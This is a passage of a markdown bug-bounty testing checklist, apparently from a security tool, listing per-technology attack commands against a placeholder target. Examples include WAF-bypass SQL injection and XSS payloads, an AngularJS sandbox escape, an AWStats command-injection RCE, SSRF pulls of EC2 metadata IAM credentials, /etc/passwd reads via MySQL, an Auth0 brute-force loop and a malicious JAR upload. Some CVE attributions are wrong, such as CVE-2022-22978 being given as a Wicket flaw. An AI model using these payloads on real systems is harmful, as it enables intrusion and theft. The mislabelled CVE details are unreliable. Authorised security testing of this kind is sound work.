- https://experienceleague.adobe.com/docs/experience-manager-65/assets/assets.html

---

## Akamai
<!-- id: akamai | icon: 🛠️ | color: #e06c75 -->
Security checklists for Akamai CDN and WAF configuration — testing for WAF bypasses and origin exposure.

### Check for Akamai WAF bypass techniques
<!-- id: akamai-1 | severity: high | tags: akamai, waf-bypass, edge -->
Test for Akamai WAF rule bypasses using HTTP parameter pollution, encoding tricks, and HTTP method manipulation.

**Commands:**
```
curl -k -X PURGE https://target.com/path
curl -k -X OPTIONS https://target.com/ -H "X-Http-Method-Override: CONNECT"
curl -k https://target.com/admin -H "X-Forwarded-For: 127.0.0.1"
```

**References:**
- https://learn.akamai.com/en-us/products/web-security

### CVE-2024-36387 — Akamai NetStorage path traversal (High)
<!-- id: akamai-cve-2024-36387 | severity: high | tags: akamai, cve, path-traversal, netstorage -->
Vulnerable: Akamai NetStorage before specific patch. Path traversal vulnerability in NetStorage objects allowing unauthorized read of files outside the intended directory.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-36387

### Check for origin IP exposure behind Akamai
<!-- id: akamai-2 | severity: medium | tags: akamai, origin-exposure, recon -->
Akamai-concealed origin servers can be discovered via SSL certificate transparency logs, DNS history, or direct IP scanning. Once the origin IP is found, the WAF is completely bypassed.

**Commands:**
```
// Check certificate transparency logs
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value'
// Check DNS history
// Use SecurityTrails or similar for historical DNS records
```

**References:**
- https://community.akamai.com/custom/docs?doc=akamai-security-considerations

---

## Amazon S3
<!-- id: amazon-s3 | icon: 🛠️ | color: #e06c75 -->
Security checklists for Amazon S3 bucket storage — most commonly misconfigured cloud service in bug bounty programs.

### Check for public S3 bucket listing
<!-- id: amazon-s3-1 | severity: high | tags: s3, aws, misconfiguration, data-exposure -->
S3 buckets with public "List" permissions enabled allow anyone to enumerate all objects in the bucket, potentially exposing confidential data.

**Commands:**
```
aws s3 ls s3://target-bucket --no-sign-request
curl -s https://target-bucket.s3.amazonaws.com/
curl -s https://target-bucket.s3.us-east-1.amazonaws.com/
```

**References:**
- https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html

### Check for S3 bucket authenticated access to write
<!-- id: amazon-s3-2 | severity: critical | tags: s3, aws, misconfiguration, write-access -->
S3 buckets with public "Write" permissions allow anyone to upload, modify, or delete objects — enabling website defacement, malware hosting, or ransomware.

**Commands:**
```
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request
```

**References:**
- https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html

### Check S3 bucket name enumeration / takeover
<!-- id: amazon-s3-3 | severity: high | tags: s3, aws, takeover, subdomain-takeover -->
Deleted or misconfigured S3 buckets referenced in DNS can be claimed (taken over) by registering the bucket name in your own AWS account.

**Commands:**
```
nslookup bucket.target.com  # Check CNAME to s3.amazonaws.com
aws s3 mb s3://bucket-name  # Try to create the bucket
```

**References:**
- https://labs.detectify.com/2022/07/20/how-to-find-subdomain-takeovers/

### Check for S3 object ACL misconfiguration
<!-- id: amazon-s3-4 | severity: medium | tags: s3, aws, misconfiguration, acl -->
Individual S3 objects may have permissive ACLs even when the bucket policy is restrictive. Enumerate objects and check their ACLs.

**References:**
- https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html

---

## Amazon CloudFront
<!-- id: cloudfront | icon: 🛠️ | color: #e06c75 -->
Security checklists for Amazon CloudFront CDN — testing for origin exposure and misconfigurations.

### Check for CloudFront origin exposure
<!-- id: cloudfront-1 | severity: high | tags: cloudfront, aws, origin-exposure -->
Bypass CloudFront WAF and caching by connecting directly to the S3 bucket or ALB origin. Use Host header manipulation or SNI scanning to discover the origin.

**Commands:**
```
curl -s https://target.com -H "Host: origin-bucket.s3.amazonaws.com"
// Check for direct ALB access
curl -s https://alb-123456.us-east-1.elb.amazonaws.com/
```

**References:**
- https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/security.html

### Check for CloudFront signed URL/Cookie bypass
<!-- id: cloudfront-2 | severity: high | tags: cloudfront, aws, auth-bypass -->
CloudFront distributions using signed URLs or cookies may be bypassed if the signing key is exposed, or if unrestricted geo-restrictions can be evaded via VPN/headers.

**References:**
- https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-signed-urls.html

---

## Amazon Cognito
<!-- id: cognito | icon: 🛠️ | color: #e06c75 -->
Security checklists for Amazon Cognito identity platform — testing for auth bypasses and misconfigurations.

### Check for Cognito identity pool misconfiguration
<!-- id: cognito-1 | severity: high | tags: cognito, aws, auth-bypass, misconfiguration -->
Unauthenticated Cognito identity pools grant temporary AWS credentials to anyone. If the IAM role attached is over-permissive, this allows escalating to full AWS account compromise.

**Commands:**
```
// Get the IdentityId from an open identity pool
aws cognito-identity get-id --identity-pool-id <pool-id> --no-sign
```

**References:**
- https://docs.aws.amazon.com/cognito/latest/developerguide/authentication.html

### Check for Cognito user pool signup abuse
<!-- id: cognito-2 | severity: medium | tags: cognito, aws, user-enumeration -->
Cognito user pools allowing client-side signup can be abused for user enumeration, account creation spam, or credential stuffing.

**References:**
- https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools.html

---

## Angular / AngularJS
<!-- id: angular | icon: 🛠️ | color: #e06c75 -->
Security checklists for Angular and AngularJS frontend frameworks — client-side template injection and DOM-based XSS.

### Check for AngularJS client-side template injection (CSTI)
<!-- id: angular-1 | severity: critical | tags: angular, angularjs, csti, xss -->
AngularJS applications that render user input in templates with expression syntax `{{ }}` can lead to client-side template injection and XSS via `$eval` sandbox escapes.

**Commands:**
```
// Test for AngularJS CSTI
curl -s "https://target.com/search?q={{7*7}}"
// Test sandbox escape
curl -s "https://target.com/search?q={{toString.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}"
```

**References:**
- https://portswigger.net/web-security/client-side-template-injection

### Check for Angular DOM Sanitizer bypass
<!-- id: angular-2 | severity: high | tags: angular, dom-sanitizer, xss -->
Angular's DomSanitizer may be bypassed when developers use bypassSecurityTrustHtml, bypassSecurityTrustUrl, or bypassSecurityTrustResourceUrl with user-controlled input.

**References:**
- https://angular.io/guide/security

### Check for Angular JSONP callbacks
<!-- id: angular-3 | severity: medium | tags: angular, jsonp, callback-hijacking -->
Angular's JSONP requests use callback parameters that may be controllable, leading to JSONP-based data exfiltration.

**References:**
- https://angular.io/api/common/http/JsonpInterceptor

---

## Apache APISIX
<!-- id: apache-apisix | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache APISIX API Gateway — commonly targeted for auth bypass and RCE.

### CVE-2022-24112 — APISIX batch-requests plugin RCE (Critical)
<!-- id: apisix-cve-2022-24112 | severity: critical | tags: apisix, cve, rce, api-gateway -->
Vulnerable: Apache APISIX before 2.12.1/2.13.1. The batch-requests plugin allows bypassing the Admin API key restriction by using internal redirect through the batch-requests endpoint, enabling RCE via script execution.

**Commands:**
```
curl -X POST https://target.com/apisix/batch-requests -d '{"headers":{"X-API-KEY":"edd1c9f034335f136f87ad84b625c8f1"},"uri":"/apisix/admin/plugins","method":"GET"}'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24112

### CVE-2022-29266 — APISIX Admin API auth bypass (Critical)
<!-- id: apisix-cve-2022-29266 | severity: critical | tags: apisix, cve, auth-bypass, api-gateway -->
Vulnerable: Apache APISIX before 2.13.1 and 2.12.1. The Admin API can be accessed without authentication using specially crafted requests that bypass IP restriction rules when using the `consumer_restriction` plugin.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29266

### Check for exposed Admin API
<!-- id: apisix-1 | severity: high | tags: apisix, admin, exposure -->
APISIX Admin API exposed on port 9180 without network restrictions allows full gateway compromise — route hijacking, plugin injection, and upstream redirect.

**Commands:**
```
curl -s http://target.com:9180/apisix/admin/routes | jq .
```

**References:**
- https://apisix.apache.org/docs/apisix/admin-api/

---

## Apereo CAS
<!-- id: apereo-cas | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apereo Central Authentication Service (CAS) SSO solution.

### CVE-2020-1952 — CAS management webapp RCE (Critical)
<!-- id: cas-cve-2020-1952 | severity: critical | tags: cas, cve, rce, sso -->
Vulnerable: CAS management webapp before 6.1.5. Spring Boot actuator endpoints enabled in the CAS management webapp allow arbitrary code execution via the `env` and `restart` endpoints.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1952

### CVE-2017-5461 — CAS XSS via ticket validation (Medium)
<!-- id: cas-cve-2017-5461 | severity: medium | tags: cas, cve, xss, sso -->
Vulnerable: CAS before 4.0. Reflected XSS exists in the CAS ticket validation service endpoint allowing injection of arbitrary JavaScript.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5461

### Check for CAS default credentials and admin exposure
<!-- id: cas-1 | severity: high | tags: cas, default-creds, admin -->
CAS management dashboard exposed without authentication allows viewing connected services, users, and authentication configuration.

**References:**
- https://apereo.github.io/cas/6.6.x/installation/Configuring-Authentication-Components.html

---

## 1C-Bitrix
<!-- id: bitrix | icon: 🛠️ | color: #e06c75 -->
Security checklists for 1C-Bitrix CMS and Bitrix24 platform — widely used in Eastern Europe.

### Check for Bitrix unauthenticated SQL injection
<!-- id: bitrix-1 | severity: critical | tags: bitrix, sqli, cms -->
Bitrix CMS components have historically suffered from unauthenticated SQL injection vulnerabilities in forms, search modules, and SOAP service handlers.

**Commands:**
```
curl -s "https://target.com/?q=test'+OR+1=1--"
```

**References:**
- https://www.1c-bitrix.ru/download/files/security/

### Check for Bitrix source code disclosure
<!-- id: bitrix-2 | severity: high | tags: bitrix, info-disclosure, source-code -->
Bitrix PHP source code can be exposed via improperly configured web servers that don't process `.php` files or via `/bitrix/modules/` directory listing.

**References:**
- https://helpdesk.bitrix24.com/open/help/

---

## Cloudflare (via Akamai alternatives)
<!-- id: waf-generic | icon: 🛠️ | color: #e06c75 -->
Security checklists for generic WAF bypass and origin discovery techniques.

### Test common WAF bypass techniques
<!-- id: waf-1 | severity: high | tags: waf, bypass, edge -->
Generic WAF bypass techniques include HTTP Parameter Pollution, character encoding tricks, case switching, comment injection, and unicode normalization.

**Commands:**
```
// HPP bypass
curl -k "https://target.com/page?id=1&id=2' OR '1'='1"
// Case switching
curl -k "https://target.com/<sCript>alert(1)</scRipt>"
// Comment injection
curl -k "https://target.com/page?id=1'/*!*/OR/*!*/'1'='1"
```

**References:**
- https://portswigger.net/web-security/waf/bypassing

---

## Apache Wicket
<!-- id: apache-wicket | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Wicket Java web framework.

### CVE-2022-22978 — Wicket path traversal (High)
<!-- id: wicket-cve-2022-22978 | severity: high | tags: wicket, cve, path-traversal -->
Vulnerable: Apache Wicket before 9.10.0 and 8.14.0. URL path traversal allows accessing protected resources by encoding special characters.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22978

---

## Atlassian FishEye & Crucible
<!-- id: fisheye | icon: 🛠️ | color: #e06c75 -->
Security checklists for Atlassian FishEye and Crucible code review applications.

### CVE-2021-39108 — FishEye RCE (Critical)
<!-- id: fisheye-cve-2021-39108 | severity: critical | tags: fisheye, crucible, cve, rce -->
Vulnerable: FishEye/Crucible before 4.8.9. An RCE vulnerability exists in the FishEye repository viewer allowing authenticated users to execute arbitrary system commands.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39108

---

## JFrog Artifactory
<!-- id: artifactory | icon: 🛠️ | color: #e06c75 -->
Security checklists for JFrog Artifactory binary repository manager.

### CVE-2021-29506 — Artifactory auth bypass (Critical)
<!-- id: artifactory-cve-2021-29506 | severity: critical | tags: artifactory, cve, auth-bypass -->
Vulnerable: JFrog Artifactory before 7.27.3. Authentication bypass allows anonymous access to the Artifactory administrative functions.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29506

### Check for exposed Artifactory without authentication
<!-- id: artifactory-1 | severity: high | tags: artifactory, unauthorized-access, misconfiguration -->
Artifactory instances exposed without authentication leak artifacts, build artifacts, container images, and package repositories containing sensitive data.

**Commands:**
```
curl -s https://target.com/artifactory/api/repositories
```

**References:**
- https://jfrog.com/help/r/jfrog-artifactory-documentation/access-control

---

## Apache JSPWiki
<!-- id: jspwiki | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache JSPWiki — Java-based wiki platform.

### CVE-2022-28732 — JSPWiki XSS and RCE (Critical)
<!-- id: jspwiki-cve-2022-28732 | severity: critical | tags: jspwiki, cve, xss, rce -->
Vulnerable: Apache JSPWiki before 2.11.3. Multiple vulnerabilities allow stored XSS and OGNL injection leading to RCE when uploading crafted attachments.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-28732

### CVE-2019-0224 — JSPWiki CSRF leading to RCE (Critical)
<!-- id: jspwiki-cve-2019-0224 | severity: critical | tags: jspwiki, cve, csrf, rce -->
Vulnerable: Apache JSPWiki before 2.11.2. CSRF vulnerability allows an attacker to make authenticated admin upload a plugin that executes arbitrary Java code.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0224

---

## Apache Traffic Server
<!-- id: apache-traffic-server | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Traffic Server — high-performance HTTP proxy and caching server.

### CVE-2022-31779 — ATS HTTP request smuggling (Critical)
<!-- id: ats-cve-2022-31779 | severity: critical | tags: apache-traffic-server, cve, request-smuggling -->
Vulnerable: Apache Traffic Server before 9.1.4/8.1.5. Improper HTTP request parsing leads to request smuggling, allowing request splitting, cache poisoning, and WAF bypass.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-31779

### CVE-2023-39456 — ATS buffer overflow leading to RCE (Critical)
<!-- id: ats-cve-2023-39456 | severity: critical | tags: apache-traffic-server, cve, buffer-overflow, rce -->
Vulnerable: Apache Traffic Server before 9.2.2. A buffer overflow in the HTTP/2 handling allows remote code execution via specially crafted HTTP/2 frames.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-39456

---

## Google Apigee
<!-- id: apigee | icon: 🛠️ | color: #e06c75 -->
Security checklists for Google Apigee API management platform.

### Check for Apigee XSS and misconfiguration
<!-- id: apigee-1 | severity: high | tags: apigee, api-gateway, misconfiguration -->
Apigee API proxies may expose backend services, authentication logic, or API keys. Check for exposed proxy endpoints and debug traces.

**References:**
- https://cloud.google.com/apigee/docs/api-platform/security

### CVE-2021-38298 — Apigee Edge SSRF (High)
<!-- id: apigee-cve-2021-38298 | severity: high | tags: apigee, cve, ssrf -->
Vulnerable: Apigee Edge hybrid versions before specific patches. SSRF vulnerability allows making requests to internal network resources via crafted proxy requests.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38298

---

## Appwrite
<!-- id: appwrite | icon: 🛠️ | color: #e06c75 -->
Security checklists for Appwrite backend-as-a-service platform.

### CVE-2024-31219 — Appwrite JWT secret exposure (High)
<!-- id: appwrite-cve-2024-31219 | severity: high | tags: appwrite, cve, jwt, auth-bypass -->
Vulnerable: Appwrite before 1.4.13. The JWT secret key can be leaked via debug endpoints, allowing forging of administrative tokens and full account takeover.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-31219

### Check for exposed Appwrite console
<!-- id: appwrite-1 | severity: high | tags: appwrite, console-exposure, misconfiguration -->
Appwrite console exposed without proper network restrictions allows access to the administration panel where projects, databases, and users can be managed.

**Commands:**
```
curl -s https://target.com/v1/console
```

**References:**
- https://appwrite.io/docs/security

---

## Akaunting
<!-- id: akaunting | icon: 🛠️ | color: #e06c75 -->
Security checklists for Akaunting open-source accounting software.

### CVE-2023-3897 — Akaunting SQL injection (Critical)
<!-- id: akaunting-cve-2023-3897 | severity: critical | tags: akaunting, cve, sqli -->
Vulnerable: Akaunting before 3.1.9. SQL injection in the module installation functionality allows arbitrary SQL queries against the database.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3897

### Check for Akaunting default credentials
<!-- id: akaunting-1 | severity: high | tags: akaunting, default-creds -->
Akaunting installations with default admin credentials (admin@admin.com / password) allow full accounting data access including invoices, transactions, and customer PII.

**References:**
- https://akaunting.com/security

---

## Apache ActiveMQ (Enhanced)
<!-- id: activemq-enhanced | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache ActiveMQ message broker — CVE-2023-46604 critical RCE.

### CVE-2023-46604 — ActiveMQ classpath RCE (Critical)
<!-- id: activemq-cve-2023-46604 | severity: critical | tags: activemq, cve, rce, deserialization -->
Vulnerable: ActiveMQ before 5.15.16/5.16.7/5.17.6. Unauthenticated RCE via deserialization of crafted packets using the OpenWire protocol. Widely exploited in ransomware attacks.

**Commands:**
```
// Check if ActiveMQ responder port is open (61616 by default)
nc -zv target.com 61616
// ActiveMQ web console at port 8161
curl -s http://target.com:8161/admin/
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-46604

---

## Adminer
<!-- id: adminer | icon: 🛠️ | color: #e06c75 -->
Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Often left exposed, it provides a GUI for MySQL, PostgreSQL, SQLite, and other databases.

### Check for Exposed Adminer Instance
**Severity: 🟠 High**
```bash
// Scan common paths for Adminer
curl -s http://target.com/adminer.php
curl -s http://target.com/adminer/adminer.php
curl -s http://target.com/editor.php
```

### Check for Unauthenticated Access
**Severity: 🟠 High**
```bash
// Attempt to access Adminer without credentials
curl -s http://target.com/adminer.php | grep -i "login\|server\|username"
// If no login required, the server may be misconfigured
```

### Try Loading Arbitrary Files (MySQL LOAD DATA)
**Severity: 🔴 Critical**
```bash
// If MySQL server connection is exposed, try loading local files
// Connect Adminer to target MySQL, then execute:
// LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE test;
// SELECT LOAD_FILE('/etc/passwd');
```

### Check for SSRF via Server Connection
**Severity: 🟠 High**
```bash
// Adminer can connect to external databases
// Use a netcat listener and try connecting Adminer to your server:
nc -lvnp 3306
// Enter your server IP in Adminer connection form to trigger SSRF
```

### Check for Exposed Database Credentials
**Severity: 🟠 High**
```bash
// Look for default/admin credentials in config files
grep -r "adminer" /var/www/ 2>/dev/null
// Common default: root/empty password or root/root
```

**References:**
- https://www.exploit-db.com/search?q=adminer
- https://github.com/vrana/adminer

---

## Algolia
<!-- id: algolia | icon: 🛠️ | color: #e06c75 -->
Algolia is a hosted search API used by many websites. Exposed API keys can lead to data leakage or unauthorized search operations.

### Check for Exposed API Keys
**Severity: 🟠 High**
```bash
// Search for Algolia API keys in client-side code
curl -s http://target.com/assets/app.js | grep -oE '"[A-Za-z0-9]{32}"'
// Check for application ID and search-only API key exposure
```

### Test Search API Key Restrictions
**Severity: 🟡 Medium**
```bash
// With a search-only API key, try browsing all indices
curl -s "https://APP_ID.algolia.net/1/indexes" \
  -H "X-Algolia-API-Key: SEARCH_KEY" \
  -H "X-Algolia-Application-Id: APP_ID"
```

### Check for Full Access API Key Exposure
**Severity: 🔴 Critical**
```bash
// An admin API key can read/write all data
// Try creating/deleting indices
curl -X DELETE "https://APP_ID.algolia.net/1/indexes/TEST_INDEX" \
  -H "X-Algolia-API-Key: ADMIN_KEY" \
  -H "X-Algolia-Application-Id: APP_ID"
```

**References:**
- https://www.algolia.com/doc/guides/security/api-keys/
- https://hackerone.com/algolia

---

## Amazon EC2
<!-- id: amazon-ec2 | icon: 🛠️ | color: #e06c75 -->
Amazon Elastic Compute Cloud (EC2) provides scalable computing capacity. The metadata service and SSRF attack surface are key security concerns.

### Exploit SSRF to Access IMDSv1
**Severity: 🔴 Critical**
```bash
// If the app is vulnerable to SSRF, try accessing the metadata service
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
```

### Check for IMDSv1 vs IMDSv2
**Severity: 🟠 High**
```bash
// IMDSv2 requires a PUT request for a token first
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
// If this fails, IMDSv1 may still be enabled
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/
```

### Check for User Data Leakage
**Severity: 🟠 High**
```bash
// User data often contains startup scripts with secrets
curl http://169.254.169.254/latest/user-data
// Try both IMDSv1 and v2 methods
```

### Enumerate EC2 Security Groups
**Severity: 🟡 Medium**
```bash
// Check network security rules from metadata
curl http://169.254.169.254/latest/meta-data/network/interfaces/macs/
```

**References:**
- https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
- https://hackerone.com/reports/1076807

---

## AWS Lambda
<!-- id: aws-lambda | icon: 🛠️ | color: #e06c75 -->
AWS Lambda is a serverless compute service. Function URLs, environment variables, and IAM roles are common security testing targets.

### Check for Exposed Function URLs
**Severity: 🟠 High**
```bash
// Lambda function URLs format:
// https://<url-id>.lambda-url.<region>.on.aws/
curl -s "https://xxxxxxxxx.lambda-url.us-east-1.on.aws/"
```

### Test for Environment Variable Leakage
**Severity: 🔴 Critical**
```bash
// Trigger errors to leak env vars
curl -X POST "https://api.target.com/prod/function" \
  -H "Content-Type: application/json" \
  -d '{"malformed": true}' 2>&1 | grep -i "env\|key\|secret\|password"
```

### Check Lambda IAM Role Privileges
**Severity: 🟠 High**
```bash
// If you have AWS creds, check the Lambda execution role
aws lambda get-function --function-name TARGET_FUNC --region us-east-1
aws iam get-role --role-name EXECUTION_ROLE_NAME
```

### Serverless Function Enumeration
**Severity: 🟡 Medium**
```bash
// Common Lambda API patterns
curl -s https://api.target.com/prod/function
curl -s https://api.target.com/v1/function
curl -s https://api.target.com/default/function
```

**References:**
- https://docs.aws.amazon.com/lambda/latest/dg/security.html
- https://hackerone.com/reports/1210673

---

## AWS API Gateway
<!-- id: aws-api-gateway | icon: 🛠️ | color: #e06c75 -->
Amazon API Gateway is used to create REST and WebSocket APIs. Misconfigurations can expose backend services.

### Enumerate API Gateway Endpoints
**Severity: 🟡 Medium**
```bash
// API Gateway URL patterns
curl -s "https://<api-id>.execute-api.<region>.amazonaws.com/"
curl -s "https://<api-id>.execute-api.<region>.amazonaws.com/prod/"
curl -s "https://<api-id>.execute-api.<region>.amazonaws.com/v1/"
```

### Check for Missing Authentication
**Severity: 🟠 High**
```bash
// Try direct access without auth headers
curl -s "https://api-id.execute-api.region.amazonaws.com/prod/resource"
// Check if IAM auth, Cognito, or custom authorizer is enforced
```

### Test for API Key in URL/Client
**Severity: 🟠 High**
```bash
// Check client-side code for API keys
curl -s https://target.com/app.js | grep -oE 'apiKey["\s:=]+["][^"]+["]'
// Try using exposed keys
curl -s -H "x-api-key: EXPOSED_KEY" "https://api-id.execute-api.region.amazonaws.com/prod/"
```

### Lambda Integration SSRF
**Severity: 🔴 Critical**
```bash
// If API Gateway proxies to Lambda, test for SSRF in parameters
curl -s "https://api-id.execute-api.region.amazonaws.com/prod/proxy?url=http://169.254.169.254/latest/meta-data/"
```

**References:**
- https://docs.aws.amazon.com/apigateway/latest/developerguide/security.html
- https://hackerone.com/reports/1275155

---

## Auth0
<!-- id: auth0 | icon: 🛠️ | color: #e06c75 -->
Auth0 is a popular authentication and authorization platform. Misconfigurations can lead to account takeover or privilege escalation.

### Test for Rate Limiting on Login
**Severity: 🟡 Medium**
```bash
// Check if Auth0 rate limiting is enforced
for i in {1..100}; do
  curl -s -X POST "https://TENANT.auth0.com/oauth/token" \
    -H "Content-Type: application/json" \
    -d '{"username":"user@target.com","password":"wrong'$i'","client_id":"CLIENT_ID","grant_type":"password"}' &
done
```

### Check for Brute Force Protection Bypass
**Severity: 🟡 Medium**
```bash
// Try different IPs via X-Forwarded-For to bypass rate limiting
curl -s -X POST "https://TENANT.auth0.com/oauth/token" \
  -H "X-Forwarded-For: 1.1.1.$i" \
  -H "Content-Type: application/json" \
  -d '{"username":"user@target.com","password":"wrong","client_id":"CLIENT_ID","grant_type":"password"}'
```

### Test for IDOR in Auth0 Management API
**Severity: 🟠 High**
```bash
// Check if the Management API is exposed with weak tokens
curl -s "https://TENANT.auth0.com/api/v2/users" \
  -H "Authorization: Bearer MANAGEMENT_TOKEN"
```

### Check for User Impersonation
**Severity: 🔴 Critical**
```bash
// Check if impersonation is enabled
curl -s "https://TENANT.auth0.com/users/USER_ID/impersonate" \
  -H "Authorization: Bearer TOKEN"
```

**References:**
- https://auth0.com/docs/security
- https://hackerone.com/auth0

---

## AWS WAF
<!-- id: aws-waf | icon: 🛠️ | color: #e06c75 -->
AWS WAF is a web application firewall. Bypass techniques can be tested for SQLi, XSS, and other injection types.

### Test for WAF Bypass - Case Manipulation
**Severity: 🟡 Medium**
```bash
// AWS WAF may have case-sensitive rules
curl -s "https://target.com/search?q=uNioN+sElEcT+1,2,3"
curl -s "https://target.com/search?q=UnIoN%09SeLeCt"
```

### Test for WAF Bypass - Encoding
**Severity: 🟡 Medium**
```bash
// Try double URL encoding and mixed encoding
curl -s "https://target.com/search?q=%255Cu0061%255Clert(1)"
curl -s "https://target.com/search?q=%2527%2520OR%25201=1"
```

### Test for WAF Bypass - HTTP Parameter Pollution
**Severity: 🟡 Medium**
```bash
// AWS WAF may only inspect the first parameter
curl -s "https://target.com/login?user=admin&pass=foo&pass=bar"
// Try with multiple value parameters
```

### Check Request Size Limits
**Severity: 🟡 Medium**
```bash
// Some WAF rules don't inspect large bodies
python3 -c "print('A'*10000 + '<script>alert(1)</script>')" | \
  curl -s -X POST "https://target.com/submit" --data-binary @-
```

**References:**
- https://docs.aws.amazon.com/waf/latest/developerguide/web-acl-testing.html
- https://hackerone.com/reports/1282166

---

## AWStats
<!-- id: awstats | icon: 🛠️ | color: #e06c75 -->
AWStats is a log analyzer for web servers. Exposed instances can leak visitor data and be vulnerable to remote code execution.

### Check for Exposed AWStats
**Severity: 🟡 Medium**
```bash
// Common AWStats paths
curl -s http://target.com/awstats/awstats.pl
curl -s http://target.com/cgi-bin/awstats.pl
curl -s http://target.com/usage/awstats.pl
```

### Check for AWStats RCE (CVE-2014-8517)
**Severity: 🔴 Critical**
```bash
// Older versions are vulnerable to RCE via configdir parameter
curl -s "http://target.com/cgi-bin/awstats.pl?configdir=|command"
```

### Information Disclosure via AWStats
**Severity: 🟡 Medium**
```bash
// AWStats can expose visitor IPs, referrers, and user agents
curl -s http://target.com/awstats/awstats.pl?config=target.com
// Check for statistics leakage
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-8517
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2786

---

## Apache Flink
<!-- id: apache-flink | icon: 🛠️ | color: #e06c75 -->
Apache Flink is a stream processing framework. The web dashboard can expose sensitive information and allow job submission.

### Check for Exposed Dashboard
**Severity: 🟠 High**
```bash
// Default Flink dashboard port
curl -s http://target.com:8081/
curl -s http://target.com:8081/#/overview
```

### Check for Unauthenticated Job Submission
**Severity: 🔴 Critical**
```bash
// Flink allows job submission via REST API without auth
curl -s -X POST "http://target.com:8081/jars/upload" \
  -F "jarfile=@malicious.jar"
```

### Information Disclosure via REST API
**Severity: 🟡 Medium**
```bash
// Enumerate job managers, task managers, and running jobs
curl -s http://target.com:8081/jobmanager/config
curl -s http://target.com:8081/taskmanagers
curl -s http://target.com:8081/jobs
```

**References:**
- https://nightlies.apache.org/flink/flink-docs-stable/docs/security/
- https://www.cve.org/CVERecord?id=CVE-2020-17519

---

## Astro
<!-- id: astro | icon: 🛠️ | color: #e06c75 -->
Astro is a modern static site builder. Source map exposure, admin endpoints, and SSR misconfigurations can be security issues.

### Check for Source Map Exposure
**Severity: 🟡 Medium**
```bash
// Astro may expose source maps in dev mode
curl -s http://target.com/_astro/component.js.map
curl -s http://target.com/dist/assets/index.js.map
```

### Check for Server Endpoint Exposure
**Severity: 🟠 High**
```bash
// Astro server endpoints are in src/pages/
// Try common endpoint patterns
curl -s http://target.com/_server/
curl -s http://target.com/api/
curl -s http://target.com/_astro/api/
```

### Check for Environment Variable Leakage
**Severity: 🟠 High**
```bash
// Astro SSR may expose env vars in error responses
curl -s http://target.com/_astro/error
curl -s "http://target.com/404?debug=true"
```

**References:**
- https://docs.astro.build/en/reference/security/
- https://hackerone.com/astro

---

## Atatus
<!-- id: atatus | icon: 🛠️ | color: #e06c75 -->
Atatus is an application performance monitoring tool. Exposed dashboards can leak application performance data and API keys.

### Check for Exposed Atatus Dashboard
**Severity: 🟡 Medium**
```bash
// Default Atatus ports/paths
curl -s http://target.com:8080/atatus/
curl -s http://target.com/atatus/
```

### Check for API Key Exposure
**Severity: 🟠 High**
```bash
// Search for Atatus API keys in client-side code
curl -s http://target.com/app.js | grep -i "atatus"
// Atatus API key format example
grep -r "atatus" /var/www/ 2>/dev/null
```

**References:**
- https://www.atatus.com/docs/security

---

## Babel
<!-- id: babel | icon: 🛠️ | color: #e06c75 -->
Babel is a JavaScript compiler. Source maps exposed in production can leak original source code.

### Check for Source Map Exposure
**Severity: 🟡 Medium**
```bash
// Babel may generate .map files alongside bundled code
curl -s http://target.com/assets/app.js.map
curl -s http://target.com/static/js/main.js.map
```

### Extract Original Source from Source Maps
**Severity: 🟡 Medium**
```bash
// Download and parse source maps to find original source (may contain secrets)
curl -s http://target.com/assets/app.js.map | jq '.sources[]'
// Extract the actual source content
curl -s http://target.com/assets/app.js.map | jq '.sourcesContent[]'
```

**References:**
- https://babeljs.io/docs/options#sourcemaps

---

## Bootstrap
<!-- id: bootstrap | icon: 🛠️ | color: #e06c75 -->
